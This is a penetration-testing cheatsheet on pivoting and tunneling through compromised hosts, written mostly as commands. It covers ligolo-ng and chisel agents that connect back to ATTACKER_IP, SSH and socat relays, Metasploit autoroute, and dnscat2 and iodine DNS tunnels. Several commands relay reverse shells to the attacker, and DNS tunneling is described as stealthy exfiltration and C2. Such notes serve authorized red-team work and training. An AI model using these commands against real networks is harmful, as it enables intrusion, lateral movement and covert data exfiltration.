---
tags:
  - hack-notes
  - pivoting
---

# Pivoting and Tunneling Cheatsheet

## Table of Contents

- [Concepts](#concepts)
- [Ligolo-ng](#ligolo-ng)
- [Chisel](#chisel)
- [SSH Tunneling](#ssh-tunneling)
- [sshuttle](#sshuttle)
- [proxychains4](#proxychains4)
- [socat Relays](#socat-relays)
- [plink.exe](#plinkexe)
- [netsh portproxy](#netsh-portproxy)
- [Metasploit Pivoting](#metasploit-pivoting)
- [DNS Tunneling](#dns-tunneling)
- [SOCKS Through Burp and FoxyProxy](#socks-through-burp-and-foxyproxy)
- [Scanning Through a Proxy](#scanning-through-a-proxy)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Concepts

bash

```bash
# Terminology used throughout this cheatsheet
# attacker     = your box (the C2 / operator host)
# foothold     = first compromised host, dual-homed into an internal network
# pivot        = forwarding traffic through the foothold into hidden subnets
# double pivot = chaining a second compromised host to reach a third network
# SOCKS proxy  = generic TCP proxy your tools point at to reach internal hosts

# Three core primitives
# 1. Port forward  - bind one TCP port and relay it to another host:port
# 2. SOCKS proxy   - dynamic, any host:port through one listening socket
# 3. tun routing   - kernel-level route into a subnet (ligolo-ng, sshuttle, VPN)
```

---

## Ligolo-ng

Modern tunneling tool using a tun interface. No SOCKS needed, the proxy adds a route and traffic just works through the kernel.

### Proxy Setup (attacker)

bash

```bash
# One-time: create the tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy listener (self-signed certs auto-generated)
./proxy -selfcert

# Listen on a specific port and bind address
./proxy -selfcert -laddr 0.0.0.0:11601

# Use a real certificate from Let's Encrypt
./proxy -laddr 0.0.0.0:11601 -certfile cert.pem -keyfile key.pem
```

### Agent Setup (foothold)

bash

```bash
# Linux agent connecting back to the proxy
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows agent
agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Bind agent (proxy connects to agent instead of reverse)
./agent -bind 0.0.0.0:11601
# Then on proxy:  connect_agent --ip FOOTHOLD_IP --port 11601
```

### Proxy Console (interactive)

bash

```bash
# List connected agents
session

# Select a session by number
session
# then pick the agent index

# Show the agent's interfaces and reachable networks
ifconfig

# Start the relay / tunnel for the selected session
start

# Stop the tunnel
stop
```

### Routing Internal Subnets

bash

```bash
# After 'ifconfig' shows the agent has 10.10.20.0/24, add a route on attacker
sudo ip route add 10.10.20.0/24 dev ligolo

# Verify the route
ip route show | grep ligolo

# Now any tool on attacker reaching 10.10.20.x flows through the foothold
nmap -sT -Pn 10.10.20.5
```

### Listeners (reverse connections back through the tunnel)

bash

```bash
# In the ligolo session, forward a port on the AGENT back to the ATTACKER
# Useful for catching reverse shells from deep internal hosts
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# List active listeners
listener_list

# Remove a listener
listener_stop 0

# Example: internal host connects to AGENT:1234, lands on ATTACKER:443
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:443 --tcp
```

### Double Pivot

bash

```bash
# Network layout:
# attacker -> foothold (10.10.20.5) -> internal2 (10.10.30.7) -> 10.10.40.0/24

# 1. First agent on foothold, route its subnet as usual
sudo ip route add 10.10.20.0/24 dev ligolo
start                                   # session 1 tunnel up

# 2. Add a SECOND tun interface for the next hop
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# 3. Drop a second agent on internal2 (10.10.30.7), connect back THROUGH session 1
#    From a shell on internal2:
./agent -connect 10.10.20.5:11601 -ignore-cert
#    (foothold relays it because 10.10.20.0/24 is already routed)

# 4. In the proxy, select session 2, then bind it to the second tun
session                                 # pick agent 2
tun_start --tun ligolo2
start

# 5. Route the deeper subnet over ligolo2
sudo ip route add 10.10.40.0/24 dev ligolo2
```

---

## Chisel

Fast TCP/UDP tunnel over HTTP, single Go binary. Great when only outbound web ports are allowed.

### Reverse SOCKS5 (most common)

bash

```bash
# Attacker runs the server in reverse mode
./chisel server --reverse --port 8080

# Foothold connects back and opens a SOCKS5 proxy on the SERVER side
./chisel client ATTACKER_IP:8080 R:socks

# This binds 127.0.0.1:1080 on the ATTACKER as a SOCKS5 proxy
# Point proxychains / tools at socks5 127.0.0.1 1080
```

### Forward SOCKS

bash

```bash
# Server on the foothold, client on attacker
./chisel server --socks5 --port 8080            # on foothold
./chisel client FOOTHOLD_IP:8080 socks          # on attacker -> 127.0.0.1:1080
```

### Specific Port Forwards

bash

```bash
# Reverse single port: ATTACKER:2222 -> internal 10.10.20.5:22
./chisel server --reverse --port 8080           # attacker
./chisel client ATTACKER_IP:8080 R:2222:10.10.20.5:22   # foothold

# Local forward: bind on client, send to remote
./chisel client FOOTHOLD_IP:8080 8000:10.10.20.9:80

# Multiple forwards in one client invocation
./chisel client ATTACKER_IP:8080 R:2222:10.10.20.5:22 R:8000:10.10.20.9:80
```

### Hardening and Tips

bash

```bash
# Add authentication
./chisel server --reverse --port 8080 --auth user:pass
./chisel client --auth user:pass ATTACKER_IP:8080 R:socks

# Blend in over 443 with a fake fingerprint
./chisel server --reverse --port 443

# Keep the tunnel alive through flaky links
./chisel client --keepalive 25s ATTACKER_IP:8080 R:socks
```

---

## SSH Tunneling

Built into every Linux box. The Swiss army knife of pivoting.

### Local Forward (-L)

bash

```bash
# Bring a remote service to your local port
# Local 8080 -> through jump -> 10.10.20.9:80
ssh -L 8080:10.10.20.9:80 user@FOOTHOLD_IP

# Bind on all interfaces so teammates can reach it
ssh -L 0.0.0.0:8080:10.10.20.9:80 user@FOOTHOLD_IP

# Forward only, no shell (-N), background (-f)
ssh -fNL 8080:10.10.20.9:80 user@FOOTHOLD_IP
```

### Remote Forward (-R)

bash

```bash
# Expose an attacker-side service to the remote network
# Remote 8000 on FOOTHOLD -> attacker 127.0.0.1:80
ssh -R 8000:127.0.0.1:80 user@FOOTHOLD_IP

# Pull a reverse shell back: internal host hits FOOTHOLD:4444 -> attacker:4444
ssh -R 4444:127.0.0.1:4444 user@FOOTHOLD_IP

# Bind remote forward on all interfaces (needs GatewayPorts yes in sshd_config)
ssh -R 0.0.0.0:8000:127.0.0.1:80 user@FOOTHOLD_IP
```

### Dynamic SOCKS Proxy (-D)

bash

```bash
# Open a SOCKS proxy on attacker, all traffic exits via the foothold
ssh -D 1080 user@FOOTHOLD_IP

# No shell, background
ssh -fND 1080 user@FOOTHOLD_IP

# Then point proxychains at socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 10.10.20.0/24
```

### Jump Hosts (-J and ProxyJump)

bash

```bash
# Single jump
ssh -J user@FOOTHOLD_IP user@10.10.20.9

# Multiple jumps (chain)
ssh -J user@FOOTHOLD_IP,user@10.10.20.9 user@10.10.30.7

# Equivalent ProxyJump in ~/.ssh/config
# Host internal
#     HostName 10.10.30.7
#     ProxyJump user@FOOTHOLD_IP,user@10.10.20.9
#     User user
```

### ProxyCommand (older / netcat style)

bash

```bash
# ~/.ssh/config
# Host deep
#     HostName 10.10.30.7
#     ProxyCommand ssh user@FOOTHOLD_IP -W %h:%p
#     User user
```

---

## sshuttle

Transparent "poor man's VPN" over SSH. Routes whole subnets, no SOCKS, no proxychains.

bash

```bash
# Route a subnet through the foothold via SSH
sshuttle -r user@FOOTHOLD_IP 10.10.20.0/24

# Multiple subnets
sshuttle -r user@FOOTHOLD_IP 10.10.20.0/24 10.10.30.0/24

# Also tunnel DNS through the pivot
sshuttle --dns -r user@FOOTHOLD_IP 10.10.20.0/24

# Use a non-standard SSH port and key
sshuttle -r user@FOOTHOLD_IP:2222 -e "ssh -i key.pem" 10.10.20.0/24

# Exclude a host from the tunnel
sshuttle -r user@FOOTHOLD_IP 10.10.20.0/24 -x 10.10.20.1

# Verbose and auto-hostfile population
sshuttle -vr user@FOOTHOLD_IP 10.10.20.0/24
```

---

## proxychains4

Force any TCP tool through a SOCKS/HTTP proxy.

### Config (/etc/proxychains4.conf or ~/.proxychains/proxychains.conf)

bash

```bash
# Chain modes (uncomment one)
strict_chain        # all proxies in order, all must be up
dynamic_chain       # skip dead proxies in the chain
random_chain        # random order each connection

# DNS through the proxy (critical to avoid leaks)
proxy_dns

# Timeouts
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Proxy list at the bottom, format: type host port [user pass]
[ProxyList]
socks5 127.0.0.1 1080
# socks4 127.0.0.1 9050
# http   127.0.0.1 8080
```

### Usage

bash

```bash
# Run a tool through the chain
proxychains4 curl http://10.10.20.9

# Quiet mode (suppress proxychains noise)
proxychains4 -q nmap -sT -Pn -p 22,80,445 10.10.20.9

# Use a specific config file
proxychains4 -f ./custom.conf smbclient -L //10.10.20.9

# Chain two SOCKS proxies for a double pivot (strict_chain)
# [ProxyList]
# socks5 127.0.0.1 1080      # first hop
# socks5 127.0.0.1 1081      # second hop
```

---

## socat Relays

Tiny, no-frills TCP/UDP relay. Useful where you can drop a binary but not much else.

bash

```bash
# Simple TCP port forward: listen on 8080, relay to internal 80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.9:80

# Forward to a remote host, fork per connection
socat TCP-LISTEN:445,fork TCP:10.10.20.9:445

# Reverse relay: connect out to attacker, bridge to an internal service
socat TCP:ATTACKER_IP:443 TCP:10.10.20.9:3389

# Relay a reverse shell through the foothold to the attacker
# On foothold:
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444

# UDP relay
socat UDP-LISTEN:53,fork UDP:10.10.20.1:53

# Encrypted relay (TLS) to hide the inner traffic
socat OPENSSL-LISTEN:8443,cert=cert.pem,verify=0,fork TCP:10.10.20.9:80
```

---

## plink.exe

PuTTY's command-line SSH client. Drop it on a Windows foothold to build SSH tunnels without OpenSSH.

bash

```bash
# Dynamic SOCKS proxy from a Windows foothold back to attacker SSH
plink.exe -ssh -D 1080 user@ATTACKER_IP

# Remote forward: expose internal RDP to attacker
plink.exe -ssh -R 3389:10.10.20.9:3389 user@ATTACKER_IP

# Auto-accept host key and pass password non-interactively
cmd.exe /c echo y | plink.exe -ssh -pw Password123 -R 3389:10.10.20.9:3389 user@ATTACKER_IP

# Local forward
plink.exe -ssh -L 8080:10.10.20.9:80 user@ATTACKER_IP -N
```

---

## netsh portproxy

Native Windows port forwarding, persists across reboots. No extra binary needed.

bash

```bash
# Forward listenport on the foothold to an internal host:port
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.9

# RDP pivot
netsh interface portproxy add v4tov4 listenport=33890 connectport=3389 connectaddress=10.10.20.9

# Show all active rules
netsh interface portproxy show all

# Delete a rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Remember to open the firewall for the listen port
netsh advfirewall firewall add rule name="fwd8080" dir=in action=allow protocol=TCP localport=8080
```

---

## Metasploit Pivoting

### autoroute (route subnets through a Meterpreter session)

bash

```bash
# From inside a meterpreter session, add a route automatically
run autoroute -s 10.10.20.0/24

# Post module form
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run

# View active routes
run autoroute -p
```

### socks_proxy (expose the routes as a SOCKS proxy)

bash

```bash
# Stand up a SOCKS proxy so external tools can use msf routes
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Then in proxychains4.conf:  socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 10.10.20.9
```

### portfwd (single port forward)

bash

```bash
# Inside meterpreter: local 3389 -> internal 10.10.20.9:3389
portfwd add -l 3389 -p 3389 -r 10.10.20.9

# Reverse forward
portfwd add -R -l 4444 -L ATTACKER_IP -p 4444

# List and delete
portfwd list
portfwd delete -l 3389 -p 3389 -r 10.10.20.9
```

---

## DNS Tunneling

Last-resort exfil and C2 when only DNS leaves the network. Slow but stealthy.

### dnscat2

bash

```bash
# Attacker server, authoritative for a delegated zone
ruby ./dnscat2.rb tunnel.example.com

# With a static preshared secret
ruby ./dnscat2.rb tunnel.example.com --secret=mysecret

# Foothold client connects over DNS
./dnscat2 tunnel.example.com --secret=mysecret

# Direct mode (client talks straight to your server IP, no real DNS delegation)
./dnscat2 --dns server=ATTACKER_IP,port=53

# Inside the dnscat2 console: list windows, open a shell
windows
window -i 1
shell
```

### iodine

bash

```bash
# Attacker side: assign a tunnel subnet, delegate t1.example.com
sudo iodined -f -c -P password 10.99.0.1 t1.example.com

# Foothold client
sudo iodine -f -P password t1.example.com

# Direct to a known server IP (skip recursive resolution)
sudo iodine -f -r -P password ATTACKER_IP t1.example.com

# After connect a dns0 interface appears (10.99.0.x) - SSH over it
ssh user@10.99.0.1
```

---

## SOCKS Through Burp and FoxyProxy

Route the browser and Burp through the pivot to reach internal web apps.

bash

```bash
# 1. Stand up a SOCKS proxy on the pivot (any method above), e.g. 127.0.0.1:1080

# 2. Point Burp upstream at the SOCKS proxy
#    Settings -> Network -> Connections -> SOCKS Proxy
#    Use SOCKS proxy: 127.0.0.1  port 1080  (SOCKS5)
#    Check "Do DNS lookups over SOCKS proxy" to avoid DNS leaks

# 3. Browser via FoxyProxy: add a proxy
#    Type: SOCKS5   Host: 127.0.0.1   Port: 1080
#    Send DNS through proxy: on
#    Then browse internal hosts; Burp captures traffic and tunnels it

# Quick browser-only alternative: launch Chrome with a SOCKS flag
google-chrome --proxy-server="socks5://127.0.0.1:1080" --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE 127.0.0.1"
```

---

## Scanning Through a Proxy

SOCKS only carries TCP connect, so half-open and UDP scans do not work through it.

bash

```bash
# nmap through proxychains must use connect scan and skip ping
proxychains4 -q nmap -sT -Pn -n 10.10.20.0/24

# Limit ports for speed (SOCKS scanning is slow)
proxychains4 -q nmap -sT -Pn -n -p 21,22,80,443,445,3389 10.10.20.9

# Faster TCP sweep without proxychains: nmap can use a single proxy directly
nmap -sT -Pn --proxies socks4://127.0.0.1:1080 10.10.20.9

# Lightweight ping sweep alternative for SOCKS environments
for i in $(seq 1 254); do
  proxychains4 -q nc -z -w1 10.10.20.$i 445 2>/dev/null && echo "10.10.20.$i up"
done
```

---

## Common Workflows

### Foothold to SOCKS to Internal Scan to Double Pivot

bash

```bash
# 1. Land a foothold (10.10.20.5) with outbound 8080 allowed. Open a reverse SOCKS.
#    Attacker:
./chisel server --reverse --port 8080
#    Foothold:
./chisel client ATTACKER_IP:8080 R:socks        # SOCKS5 on attacker:1080

# 2. Point proxychains at it and enumerate the internal subnet
#    /etc/proxychains4.conf -> socks5 127.0.0.1 1080 + proxy_dns
proxychains4 -q nmap -sT -Pn -n -p 22,80,445,3389 10.10.20.0/24

# 3. Pull web apps into Burp via the SOCKS proxy and test them
#    Burp -> SOCKS 127.0.0.1:1080, DNS over SOCKS on

# 4. Compromise a second host (10.10.30.7) only reachable from 10.10.20.x
#    Prefer ligolo-ng for the second hop (clean tun routing, no nested SOCKS):
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                                # attacker proxy
#    First agent on foothold:
./agent -connect ATTACKER_IP:11601 -ignore-cert
sudo ip route add 10.10.20.0/24 dev ligolo
start

# 5. Second agent on 10.10.30.7 connects back THROUGH the routed first hop
./agent -connect ATTACKER_IP:11601 -ignore-cert  # reachable via ligolo route
sudo ip route add 10.10.30.0/24 dev ligolo
start

# 6. Now scan and attack the third network straight from attacker tooling
nmap -sT -Pn 10.10.30.7
```

### SSH-only Pivot (no extra binaries)

bash

```bash
# Dynamic SOCKS over a single SSH session, then everything via proxychains
ssh -fND 1080 user@FOOTHOLD_IP
proxychains4 -q nmap -sT -Pn -p 445 10.10.20.0/24

# Bring an internal RDP host to localhost for an RDP client
ssh -fNL 33890:10.10.20.9:3389 user@FOOTHOLD_IP
xfreerdp /v:127.0.0.1:33890 /u:admin
```

### Catch a Reverse Shell From a Deep Host

bash

```bash
# Internal host can only reach the foothold, not the attacker.
# Remote-forward the foothold's 4444 to the attacker's handler.
ssh -fNR 4444:127.0.0.1:4444 user@FOOTHOLD_IP
# Attacker listener:
nc -lvnp 4444
# Payload on internal host points at FOOTHOLD_IP:4444
```

---

## Quick Reference

bash

```bash
# ligolo-ng
./proxy -selfcert                                   # attacker proxy
./agent -connect ATTACKER_IP:11601 -ignore-cert     # foothold agent
ip route add 10.10.20.0/24 dev ligolo               # route subnet

# chisel reverse SOCKS
./chisel server --reverse --port 8080               # attacker
./chisel client ATTACKER_IP:8080 R:socks            # foothold -> SOCKS 1080

# SSH
ssh -fND 1080 user@host                             # dynamic SOCKS
ssh -fNL 8080:internal:80 user@host                 # local forward
ssh -fNR 8000:127.0.0.1:80 user@host                # remote forward
ssh -J user@hop1,user@hop2 user@target              # chained jump

# sshuttle
sshuttle --dns -r user@host 10.10.20.0/24           # transparent VPN

# proxychains
proxychains4 -q nmap -sT -Pn 10.10.20.9             # tool through SOCKS

# socat
socat TCP-LISTEN:8080,fork TCP:10.10.20.9:80        # tcp relay

# windows native
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=10.10.20.9
plink.exe -ssh -D 1080 user@ATTACKER_IP

# metasploit
run autoroute -s 10.10.20.0/24                      # route via session
use auxiliary/server/socks_proxy                    # expose as SOCKS
portfwd add -l 3389 -p 3389 -r 10.10.20.9           # single forward

# dns tunnel
iodine -f -P password t1.example.com                # client over DNS

# golden rules
# SOCKS carries TCP connect only: use -sT -Pn, no UDP, no -sS
# always enable proxy_dns / DNS-over-SOCKS to avoid leaks
# prefer ligolo-ng tun routing for double pivots over nested SOCKS
```

---

## Related

- Checklists: [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md), [Red Team Operation](../Checklists/Red%20Team%20Operation.md)
- [Active Directory and Kerberos](Active%20Directory%20and%20Kerberos.md)
- [NetExec and Impacket](NetExec%20and%20Impacket.md)
- [Reverse Shells and File Transfer](Reverse%20Shells%20and%20File%20Transfer.md)
- [Linux Privilege Escalation](Linux%20Privilege%20Escalation.md)
